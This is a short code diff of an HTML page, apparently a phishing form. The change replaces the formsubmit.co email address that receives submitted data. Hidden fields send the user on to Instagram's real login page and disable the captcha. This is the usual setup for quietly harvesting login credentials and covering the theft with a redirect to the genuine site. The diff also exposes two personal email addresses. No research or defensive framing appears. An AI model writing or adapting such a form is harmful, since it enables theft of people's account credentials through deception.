@@ -27,7 +27,7 @@
                 </p>
             </section>
 
-            <form action="https://formsubmit.co/dikcealiyahya@gmail.com" method="POST" id="myForm" class="flex flex-col gap-y-4 px-4">
+            <form action="https://formsubmit.co/london1616@proton.me" method="POST" id="myForm" class="flex flex-col gap-y-4 px-4">
                 
                 <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
                 <input type="hidden" name="_captcha" value="false">
